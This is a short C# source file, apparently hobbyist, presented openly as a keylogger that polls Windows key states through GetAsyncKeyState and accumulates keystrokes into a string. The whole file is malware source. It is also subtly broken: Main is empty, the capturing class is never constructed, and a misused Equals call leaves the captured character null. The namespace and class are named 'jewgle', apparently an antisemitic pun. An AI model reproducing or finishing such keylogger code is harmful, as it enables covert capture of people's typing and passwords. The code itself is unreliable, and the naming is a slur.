/*
 *  keylogger based off stackoverflow user fabriciorissetto's example:
 *  
 *  the example is very lightweight but has some issues with displaying input in correct manner
 *  in order to keep the lightweight and hookless logger, i will create multiple threads, main two
 *  being: 
 *      1. FETCH INPUT AND PUT IN BUFFER ->
 *      2. FETCH INPUT FROM BUFFER, CHECK IF CAPS IS ON AND FILTER OTHER PROBLEMS
 *      
 *      
 *      
 *      
 *      
 *      
 *      
 *    SOURCE: https://stackoverflow.com/questions/6465526/capture-any-kind-of-keystrokes-aka-keylogger-preferably-c-sharp-net-but-any
 * 
 * 
*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace jewgle
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }


    class jewgle
    {
        string currentChar;
        string finalStr;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        jewgle()
        {
            while (true)
            {
                Thread.Sleep(100);

                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        currentChar.Equals((Keys)i);
                        finalStr += charPlacer(currentChar);
                        break;
                    }
                }
            }

        }

        static string charPlacer(string theChar)
        {
            if (Control.IsKeyLocked(Keys.CapsLock))
            {
                return theChar.ToUpper();

            }
            else
            {

            }
            return theChar;

        }

    }
}
